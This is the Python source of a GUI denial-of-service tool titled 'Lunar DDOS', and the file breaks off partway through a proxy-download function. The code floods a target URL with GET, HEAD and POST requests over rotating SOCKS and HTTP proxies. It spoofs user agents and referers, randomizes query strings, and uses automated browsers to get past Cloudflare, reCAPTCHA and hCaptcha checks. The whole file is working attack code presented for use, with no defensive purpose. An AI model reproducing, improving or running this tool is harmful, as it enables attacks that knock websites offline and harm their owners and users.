import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import subprocess
import re
import json
import base64
import hashlib
from pystyle import *
from colorama import Fore
from tkinter import *
from tkinter import ttk
from seleniumbase import Driver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from urllib.parse import urlparse
from fake_useragent import UserAgent
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from random import choice as Choice
from random import randint as Intn
import string

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
white = Fore.WHITE

mode = "cc"
url = ""
proxy_ver = "5"
brute = False
out_file = "proxy.txt"
thread_num = 1500
requests_per_conn = 100  # New variable for requests per connection
data = ""
cookies = ""
target = ""
path = "/"
port = 80
protocol = "http"
proxies = []
nums = 0
user_agents = []
cf_clearance = ""
cf_bm = ""
captcha_solver_active = False
driver = None
strings = string.ascii_letters + string.digits
event = threading.Event()
stop_event = threading.Event()

# Initialize UserAgent once and cache user agents
try:
    ua = UserAgent()
    # Preload common user agents
    cached_user_agents = [ua.random for _ in range(1000)]
except:
    cached_user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
    ]

class CaptchaSolver:
    def __init__(self):
        self.driver = None
        self.recaptcha_public_key_pattern = re.compile(r'data-sitekey="([^"]+)"')
        self.hcaptcha_public_key_pattern = re.compile(r'data-sitekey="([^"]+)"')
        self.cf_challenge_pattern = re.compile(r'name="cf_captcha_kind" value="([^"]+)"')
        
    def start_driver(self):
        if not self.driver:
            self.driver = Driver(uc=True, headless=True, incognito=True)
    
    def close_driver(self):
        if self.driver:
            self.driver.quit()
            self.driver = None
    
    def solve_cloudflare(self, url):
        try:
            self.start_driver()
            self.driver.get(url)
            
            if "Checking your browser before accessing" in self.driver.page_source:
                print(f"{green}[CAPTCHA]{reset} Solving Cloudflare challenge...")
                time.sleep(5)  
                
                for cookie in self.driver.get_cookies():
                    if cookie['name'] == 'cf_clearance':
                        return cookie['value']
            
            return None
        except Exception as e:
            print(f"{red}[ERROR]{reset} Cloudflare solve error: {str(e)}")
            return None
        finally:
            self.close_driver()
    
    def solve_recaptcha(self, url, site_key):
        try:
            self.start_driver()
            self.driver.get(url)
            
            WebDriverWait(self.driver, 10).until(
                EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[src^='https://www.google.com/recaptcha/api2/anchor']"))
            )
            
            checkbox = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, ".recaptcha-checkbox"))
            )
            checkbox.click()
            
            self.driver.switch_to.default_content()
            
            time.sleep(5)
            
            token = self.driver.execute_script(
                "return document.getElementById('g-recaptcha-response').value;"
            )
            
            return token
        except Exception as e:
            print(f"{red}[ERROR]{reset} reCAPTCHA solve error: {str(e)}")
            return None
        finally:
            self.close_driver()
    
    def solve_hcaptcha(self, url, site_key):
        try:
            self.start_driver()
            self.driver.get(url)
            
            WebDriverWait(self.driver, 10).until(
                EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[src^='https://hcaptcha.com/']"))
            )
            
            checkbox = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, ".h-captcha"))
            )
            checkbox.click()
            
            self.driver.switch_to.default_content()
            
            time.sleep(5)
            
            token = self.driver.execute_script(
                "return document.querySelector('[name=h-captcha-response]').value;"
            )
            
            return token
        except Exception as e:
            print(f"{red}[ERROR]{reset} hCAPTCHA solve error: {str(e)}")
            return None
        finally:
            self.close_driver()

captcha_solver = CaptchaSolver()

class NightSkyCanvas(Canvas):
    def __init__(self, parent, width, height, *args, **kwargs):
        Canvas.__init__(self, parent, width=width, height=height, *args, **kwargs)
        self.width = width
        self.height = height
        self.configure(bg='#0a0a1a', highlightthickness=0)
        self.create_moon()
        self.create_stars()
        
    def create_moon(self):
        # Create a moon in the top right corner
        self.create_oval(self.width - 80, 20, self.width - 20, 80, 
                         fill="#f0f0a0", outline="#c0c080", width=2)
        # Moon craters
        self.create_oval(self.width - 60, 40, self.width - 50, 50, 
                         fill="#d0d090", outline="")
        self.create_oval(self.width - 70, 60, self.width - 65, 65, 
                         fill="#d0d090", outline="")
        self.create_oval(self.width - 40, 30, self.width - 35, 35, 
                         fill="#d0d090", outline="")
    
    def create_stars(self):
        # Create random stars
        for _ in range(100):
            x = random.randint(0, self.width)
            y = random.randint(0, 150)  # Only in top part
            size = random.choice([1, 1, 1, 2])
            self.create_oval(x, y, x+size, y+size, fill="white", outline="")

class DDoSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Lunar DDOS GUI")
        self.root.geometry("950x750")
        self.root.resizable(False, False)
        self.root.configure(bg='#0a0a1a')
        
        # Create night sky background
        self.night_sky = NightSkyCanvas(root, width=950, height=150)
        self.night_sky.pack(fill=X)
        
        # Main container frame
        self.main_container = Frame(root, bg='#0a0a1a')
        self.main_container.pack(fill=BOTH, expand=True)
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TFrame', background='#0a0a1a')
        self.style.configure('TLabel', background='#0a0a1a', foreground='#e0e0e0', font=('Helvetica', 10))
        self.style.configure('TButton', background='#1a1a3a', foreground='white', font=('Helvetica', 10))
        self.style.map('TButton', background=[('active', '#2a2a4a')])
        self.style.configure('TEntry', fieldbackground='#1a1a3a', foreground='white', insertcolor='white')
        self.style.configure('TCombobox', fieldbackground='#1a1a3a', foreground='white')
        self.style.configure('TCheckbutton', background='#0a0a1a', foreground='#e0e0e0')
        self.style.configure('TLabelframe', background='#0a0a1a', foreground='#e0e0e0')
        self.style.configure('TLabelframe.Label', background='#0a0a1a', foreground='#e0e0e0')
        
        # Header frame
        self.header_frame = ttk.Frame(self.main_container)
        self.header_frame.pack(fill=X, pady=(0, 10))
        
        self.title_label = Label(self.header_frame, text="Lunar DDOS V.1.0", 
                               font=("Helvetica", 20, "bold"), fg="#6080ff", bg='#0a0a1a')
        self.title_label.pack()
        
        self.subtitle_label = Label(self.header_frame, text="Powerful Layer 7 Attack Tool with CAPTCHA Bypass", 
                                   font=("Helvetica", 10), fg="#a0a0ff", bg='#0a0a1a')
        self.subtitle_label.pack()
        
        # Input frame
        self.input_frame = ttk.LabelFrame(self.main_container, text="Attack Configuration")
        self.input_frame.pack(fill=X, padx=10, pady=5)
        
        # Row 0
        self.url_label = ttk.Label(self.input_frame, text="Target URL:")
        self.url_label.grid(row=0, column=0, sticky=W, padx=5, pady=5)
        self.url_entry = ttk.Entry(self.input_frame, width=50)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, columnspan=2)
        
        # Row 1
        self.mode_label = ttk.Label(self.input_frame, text="Attack Mode:")
        self.mode_label.grid(row=1, column=0, sticky=W, padx=5, pady=5)
        self.mode_combo = ttk.Combobox(self.input_frame, values=["CC", "POST", "HEAD"], state="readonly")
        self.mode_combo.grid(row=1, column=1, padx=5, pady=5, sticky=W)
        self.mode_combo.current(0)
        
        self.req_label = ttk.Label(self.input_frame, text="Requests/Conn:")
        self.req_label.grid(row=1, column=2, sticky=W, padx=5, pady=5)
        self.req_entry = ttk.Entry(self.input_frame, width=10)
        self.req_entry.insert(0, "100")
        self.req_entry.grid(row=1, column=3, padx=5, pady=5, sticky=W)
        
        # Row 2
        self.proxy_label = ttk.Label(self.input_frame, text="Proxy Type:")
        self.proxy_label.grid(row=2, column=0, sticky=W, padx=5, pady=5)
        self.proxy_combo = ttk.Combobox(self.input_frame, values=["SOCKS4", "SOCKS5", "HTTP"], state="readonly")
        self.proxy_combo.grid(row=2, column=1, padx=5, pady=5, sticky=W)
        self.proxy_combo.current(1)
        
        self.threads_label = ttk.Label(self.input_frame, text="Threads:")
        self.threads_label.grid(row=2, column=2, sticky=W, padx=5, pady=5)
        self.threads_entry = ttk.Entry(self.input_frame, width=10)
        self.threads_entry.insert(0, "1500")
        self.threads_entry.grid(row=2, column=3, padx=5, pady=5, sticky=W)
        
        # Row 3
        self.duration_label = ttk.Label(self.input_frame, text="Duration (seconds):")
        self.duration_label.grid(row=3, column=0, sticky=W, padx=5, pady=5)
        self.duration_entry = ttk.Entry(self.input_frame, width=10)
        self.duration_entry.insert(0, "120")
        self.duration_entry.grid(row=3, column=1, padx=5, pady=5, sticky=W)
        
        # Options row
        self.brute_var = IntVar()
        self.brute_check = ttk.Checkbutton(self.input_frame, text="Brute Mode", variable=self.brute_var)
        self.brute_check.grid(row=4, column=0, sticky=W, padx=5, pady=5)
        
        self.captcha_var = IntVar(value=1)
        self.captcha_check = ttk.Checkbutton(self.input_frame, text="Enable CAPTCHA Bypass", variable=self.captcha_var)
        self.captcha_check.grid(row=4, column=1, sticky=W, padx=5, pady=5)
        
        # Proxy options frame
        self.proxy_options_frame = ttk.LabelFrame(self.main_container, text="Proxy Management")
        self.proxy_options_frame.pack(fill=X, padx=10, pady=5)
        
        self.proxy_file_label = ttk.Label(self.proxy_options_frame, text="Proxy File:")
        self.proxy_file_label.grid(row=0, column=0, sticky=W, padx=5, pady=5)
        self.proxy_file_entry = ttk.Entry(self.proxy_options_frame, width=40)
        self.proxy_file_entry.insert(0, "proxy.txt")
        self.proxy_file_entry.grid(row=0, column=1, padx=5, pady=5)
        
        self.download_proxies_btn = ttk.Button(self.proxy_options_frame, text="Download Proxies", 
                                              command=self.download_proxies)
        self.download_proxies_btn.grid(row=0, column=2, padx=5, pady=5)
        
        self.check_proxies_btn = ttk.Button(self.proxy_options_frame, text="Check Proxies", 
                                           command=self.check_proxies)
        self.check_proxies_btn.grid(row=0, column=3, padx=5, pady=5)
        
        # Attack button
        self.attack_btn = ttk.Button(self.main_container, text="LAUNCH ATTACK", 
                                    command=self.start_attack, style='TButton')
        self.attack_btn.pack(pady=10)
        
        # Log frame
        self.log_frame = ttk.LabelFrame(self.main_container, text="Attack Log")
        self.log_frame.pack(fill=BOTH, expand=True, padx=10, pady=5)
        
        self.log_text = Text(self.log_frame, bg="#1a1a3a", fg="#e0e0e0", font=("Consolas", 9), 
                            insertbackground='white', highlightthickness=0)
        self.log_text.pack(fill=BOTH, expand=True, padx=5, pady=5)
        
        self.scrollbar = ttk.Scrollbar(self.log_text)
        self.scrollbar.pack(side=RIGHT, fill=Y)
        self.log_text.config(yscrollcommand=self.scrollbar.set)
        self.scrollbar.config(command=self.log_text.yview)
        
        # Status bar
        self.status_var = StringVar()
        self.status_var.set("Ready")
        self.status_bar = ttk.Label(self.main_container, textvariable=self.status_var, relief=SUNKEN)
        self.status_bar.pack(fill=X, padx=10, pady=(0, 5))
        
        # Configure text tags
        self.log_text.tag_config("error", foreground="#ff6060")
        self.log_text.tag_config("success", foreground="#60ff60")
        self.log_text.tag_config("warning", foreground="#ffff60")
        self.log_text.tag_config("info", foreground="#60a0ff")
        
    def log(self, message, level="info"):
        timestamp = datetime.datetime.now().strftime("[%H:%M:%S] ")
        self.log_text.insert(END, timestamp + message + "\n", level)
        self.log_text.see(END)
        self.root.update()
    
    def download_proxies(self):
        proxy_type = self.proxy_combo.get().lower()
        out_file = self.proxy_file_entry.get()
        
        threading.Thread(target=self._download_proxies, args=(proxy_type, out_file), daemon=True).start()
    
    def _download_proxies(self, proxy_type, out_file):
        self.status_var.set("Downloading proxies...")
        self.log(f"Downloading {proxy_type} proxies to {out_file}", "info")
        
        try:
            DownloadProxies(proxy_type)
            self.log("Proxy download completed successfully!", "success")
        except Exception as e:
            self.log(f"Error downloading proxies: {str(e)}", "error")
        
        self.status_var.set("Ready")
    
    def check_proxies(self):
        proxy_file = self.proxy_file_entry.get()
        
        threading.Thread(target=self._check_proxies, args=(proxy_file,), daemon=True).start()
    
    def _check_proxies(self, proxy_file):
        self.status_var.set("Checking proxies...")
        self.log(f"Checking proxies in {proxy_file}", "info")
        
        try:
            check_socks(3)
            self.log(f"Proxy check completed! Working proxies: {len(proxies)}", "success")
        except Exception as e:
            self.log(f"Error checking proxies: {str(e)}", "error")
        
        self.status_var.set("Ready")
    
    def start_attack(self):
        global mode, url, proxy_ver, brute, thread_num, requests_per_conn, out_file, period, captcha_solver_active
        
        url = self.url_entry.get()
        mode = self.mode_combo.get().lower()
        proxy_ver = self.proxy_combo.get().lower()
        brute = bool(self.brute_var.get())
        thread_num = int(self.threads_entry.get())
        requests_per_conn = int(self.req_entry.get())  # Get requests per connection value
        period = int(self.duration_entry.get())
        out_file = self.proxy_file_entry.get()
        captcha_solver_active = bool(self.captcha_var.get())
        
        if not url:
            self.log("Please enter a target URL", "error")
            return
        
        self.log(f"Starting attack on {url} with {thread_num} threads", "info")
        self.log(f"Requests per connection: {requests_per_conn}", "info")
        self.status_var.set("Attack in progress...")
        
        stop_event.clear()
        
        threading.Thread(target=self._start_attack, daemon=True).start()
    
    def _start_attack(self):
        try:
            ParseUrl(url)
            
            if not os.path.exists(out_file):
                self.log(f"Proxies file {out_file} not found", "error")
                return
                
            global proxies
            proxies = open(out_file).readlines()
            check_list(out_file)
            proxies = open(out_file).readlines()
            
            if len(proxies) == 0:
                self.log("No working proxies found. Please download a new proxies list.", "error")
                return
                
            self.log(f"Number of proxies: {len(proxies)}", "info")
            
            if captcha_solver_active:
                self.log("Attempting to bypass CAPTCHA protection...", "info")
                cf_token = captcha_solver.solve_cloudflare(url)
                if cf_token:
                    global cf_clearance
                    cf_clearance = cf_token
                    self.log("Successfully bypassed Cloudflare protection!", "success")
            
            build_threads(mode, thread_num, event, proxy_ver)
            event.clear()
            event.set()
            
            self.log(f"Attack started! Running for {period} seconds...", "success")
            
            start_time = time.time()
            while time.time() - start_time < period and not stop_event.is_set():
                elapsed = int(time.time() - start_time)
                remaining = period - elapsed
                self.status_var.set(f"Attack in progress... {elapsed}s / {period}s")
                time.sleep(1)
            
            stop_event.set()
            
            self.log("Attack completed successfully!", "success")
            self.status_var.set("Ready")
            
        except Exception as e:
            self.log(f"Error during attack: {str(e)}", "error")
            self.status_var.set("Error occurred")
            stop_event.set()

def bannerm():
    print(Colorate.Horizontal(Colors.blue_to_purple, ("""
 ██▓     █    ██  ███▄    █  ▄▄▄       ██▀███  
▓██▒     ██  ▓██▒ ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒
▒██░    ▓██  ▒██░▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒
▒██░    ▓▓█  ░██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄ 
░██████▒▒▒█████▓ ▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒
░ ▒░▓  ░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░
░ ░ ▒  ░░░▒░ ░ ░ ░ ░░   ░ ▒░  ▒   ▒▒ ░  ░▒ ░ ▒░
  ░ ░    ░░░ ░ ░    ░   ░ ░   ░   ▒     ░░   ░ 
    ░  ░   ░              ░       ░  ░   ░                                                                   
""")))
    print("\n")

def clearcs():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept-Encoding: gzip, deflate, br, zstd\r\nAccept-Language: en-US,en;q=0.9\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/webp,*/*;q=0.5\r\nAccept-Charset: utf-8\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/webp,image/apng,image/*,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/webp, image/apng, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: en-US,en;q=0.9\r\n",
    "Accept: text/plain;q=0.8,image/webp,*/*;q=0.5\r\nAccept-Charset: utf-8\r\nAccept-Encoding: gzip, deflate, br\r\n",
]

referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://duckduckgo.com/?q=",
    "https://www.reddit.com/search?q=",
    "https://www.tiktok.com/search?q=",
    "https://www.amazon.com/s?k=",
    "https://www.ebay.com/sch/i.html?_nkw=",
    "https://www.twitch.tv/search?term=",
    "https://www.instagram.com/explore/tags/",
    "https://www.linkedin.com/search/results/all/?keywords=",
    "https://www.pinterest.com/search/pins/?q=",
    "https://www.tumblr.com/search/",
    "https://www.walmart.com/search?q=",
    "https://www.target.com/s?searchTerm=",
    "https://www.bestbuy.com/site/searchpage.jsp?st=",
    "https://www.apple.com/us/search/",
    "https://www.microsoft.com/en-us/search/explore?q=",
    "https://www.netflix.com/search?q=",
    "https://www.hulu.com/search?q=",
    "https://www.disneyplus.com/search?q=",
]

def get_realistic_user_agent():
    try:
        return Choice(cached_user_agents)
    except:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"

def ParseUrl(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"

    if not original_url:
        print(f"{red}> Error:{reset} No URL provided")
        exit()

    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    else:
        print(f"{red}> Error:{reset} Invalid URL format. Please include http:// or https://")
        exit()
      
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    
    target = check[0]
    
    if len(tmp) > 1:
        path = url.replace(website, "", 1)
    
    try:
        socket.gethostbyname(target)
    except socket.gaierror:
        print(f"{red}> Error:{reset} Could not resolve hostname")
        exit()

def InputOption(question, options, default):
    ans = ""
    while ans == "":
        ans = str(input(question)).strip().lower()
        if ans == "":
            ans = default
        elif ans not in options:
            print(f"{red}> Error:{reset} Invalid option")
            ans = ""
            continue
    return ans

def GenReqHeader(method):
    global data, target, path
    header = ""
    
    if method == "get" or method == "head":
        connection = "Connection: keep-alive\r\n"
        if cookies != "":
            connection += "Cookie: " + str(cookies) + "\r\n"
        if cf_clearance:
            connection += "Cookie: cf_clearance=" + cf_clearance + "\r\n"
        
        accept = Choice(acceptall)
        referer = "Referer: " + Choice(referers) + target + path + "\r\n"
        useragent = "User-Agent: " + get_realistic_user_agent() + "\r\n"
        sec_ch_ua = 'sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"\r\n'
        sec_ch_ua_mobile = "sec-ch-ua-mobile: ?0\r\n"
        sec_ch_ua_platform = 'sec-ch-ua-platform: "Windows"\r\n'
        sec_fetch_site = "sec-fetch-site: same-origin\r\n"
        sec_fetch_mode = "sec-fetch-mode: navigate\r\n"
        sec_fetch_user = "sec-fetch-user: ?1\r\n"
        sec_fetch_dest = "sec-fetch-dest: document\r\n"
        accept_encoding = "Accept-Encoding: gzip, deflate, br, zstd\r\n"
        accept_language = "Accept-Language: en-US,en;q=0.9\r\n"
        
        header = (referer + useragent + accept + connection + sec_ch_ua + sec_ch_ua_mobile + 
                 sec_ch_ua_platform + sec_fetch_site + sec_fetch_mode + sec_fetch_user + 
                 sec_fetch_dest + accept_encoding + accept_language + "\r\n")
    
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + get_realistic_user_agent() + "\r\n"
        accept = Choice(acceptall)
        
        if data == "":
            form_fields = [
                "username=" + ''.join(Choice(strings) for _ in range(8)),
                "password=" + ''.join(Choice(strings) for _ in range(12)),
                "email=" + ''.join(Choice(strings) for _ in range(5)) + "@" + ''.join(Choice(strings) for _ in range(5)) + ".com",
                "csrf_token=" + hashlib.md5(os.urandom(32)).hexdigest(),
                "remember_me=1",
                "submit=Submit"
            ]
            data = "&".join(form_fields)
        
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: keep-alive\r\n"
        if cookies != "":
            length += "Cookie: " + str(cookies) + "\r\n"
        if cf_clearance:
            length += "Cookie: cf_clearance=" + cf_clearance + "\r\n"
        
        header = (post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n")
    
    return header

def randomurl():
    return str(Intn(0, 271400281257))

def cc(event, proxy_type):
    header = GenReqHeader("get")
    add = "?"
    if "?" in path:
        add = "&"
    
    event.wait()
    
    while not stop_event.is_set():
        s = None
        try:
            proxy = Choice(proxies).strip().split(":")
            if len(proxy) != 2:
                continue
                
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            s.settimeout(3)
            s.connect((str(target), int(port)))
            
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            for _ in range(requests_per_conn):  # Use the global requests_per_conn variable
                if stop_event.is_set():
                    break
                    
                time.sleep(random.uniform(0.1, 0.5))
                
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                
                if not sent:
                    break
                
            s.close()
        except Exception as e:
            if s:
                try:
                    s.close()
                except:
                    pass
            continue

def head(event, proxy_type):
    header = GenReqHeader("head")
    add = "?"
    if "?" in path:
        add = "&"
    
    event.wait()
    
    while not stop_event.is_set():
        s = None
        try:
            proxy = Choice(proxies).strip().split(":")
            if len(proxy) != 2:
                continue
                
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            s.settimeout(3)
            s.connect((str(target), int(port)))
            
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            
            for _ in range(requests_per_conn):  # Use the global requests_per_conn variable
                if stop_event.is_set():
                    break
                    
                time.sleep(random.uniform(0.1, 0.5))
                
                head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = head_host + header
                sent = s.send(str.encode(request))
                
                if not sent:
                    break
                
            s.close()
        except Exception as e:
            if s:
                try:
                    s.close()
                except:
                    pass
            continue

def post(event, proxy_type):
    request = GenReqHeader("post")
    
    event.wait()
    
    while not stop_event.is_set():
        s = None
        try:
            proxy = Choice(proxies).strip().split(":")
            if len(proxy) != 2:
                continue
                
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            s.settimeout(3)
            s.connect((str(target), int(port)))
            
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            
            for _ in range(requests_per_conn):  # Use the global requests_per_conn variable
                if stop_event.is_set():
                    break
                    
                time.sleep(random.uniform(0.2, 1.0))
                
                sent = s.send(str.encode(request))
                if not sent:
                    break
                
            s.close()
        except Exception as e:
            if s:
                try:
                    s.close()
                except:
                    pass
            continue

def checking(lines, proxy_type, ms, rlock):
    global nums, proxies
    proxy = lines.strip().split(":")
    
    if len(proxy) != 2:
        rlock.acquire()
        try:
            proxies.remove(lines)
        except ValueError:
            pass
        rlock.release()
        return
    
    err = 0
    while err < 3:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            
            s.settimeout(ms)
            s.connect(("1.1.1.1", 80))
            sent = s.send(str.encode("GET / HTTP/1.1\r\nHost: 1.1.1.1\r\n\r\n"))
            
            if not sent:
                err += 1
            else:
                break
                
            s.close()
        except:
            err += 1
        finally:
            if 's' in locals():
                try:
                    s.close()
                except:
                    pass
    
    nums += 1
    if err >= 3:
        rlock.acquire()
        try:
            proxies.remove(lines)
        except ValueError:
            pass
        rlock.release()

def check_socks(ms):
    global nums
    thread_list = []
    rlock = threading.RLock()
    
    for lines in list(proxies):
        if stop_event.is_set():
            break
            
        if proxy_ver == "5":
            th = threading.Thread(target=checking, args=(lines, 5, ms, rlock), daemon=True)
        elif proxy_ver == "4":
            th = threading.Thread(target=checking, args=(lines, 4, ms, rlock), daemon=True)
        elif proxy_ver == "http":
            th = threading.Thread(target=checking, args=(lines, 0, ms, rlock), daemon=True)
        else:
            continue
            
        th.start()
        thread_list.append(th)
        time.sleep(0.01)
        sys.stdout.write(f"{red}> Checked{reset} " + str(nums) + " proxies\r")
        sys.stdout.flush()
    
    for th in thread_list:
        th.join()
        sys.stdout.write(f"{red}> Checked{reset} " + str(nums) + " proxies\r")
        sys.stdout.flush()
    
    print(f"\r\n{red}> Checked{reset} all proxies, Total Worked:" + str(len(proxies)))
    with open(out_file, 'wb') as fp:
        for lines in list(proxies):
            fp.write(bytes(lines, encoding='utf8'))
    print(f"{red}> Saved{reset} in " + out_file)

def check_list(socks_file):
    print(f"{red}> Checking{reset} proxy list")
    temp = open(socks_file).readlines()
    temp_list = []
    
    for i in temp:
        if i not in temp_list:
            if ':' in i and '#' not in i:
                try:
                    socket.inet_pton(socket.AF_INET, i.strip().split(":")[0])
                    temp_list.append(i)
                except:
                    pass
    
    with open(socks_file, "wb") as rfile:
        for i in list(temp_list):
            rfile.write(bytes(i, encoding='utf-8'))

def DownloadProxies(proxy_ver):
    if proxy_ver == "4":
        with open(out_file, 'wb') as f:
            socks4_api = [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
                "https://openproxylist.xyz/socks4.txt",
                "https://proxyspace.pro/socks4.txt",
                "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
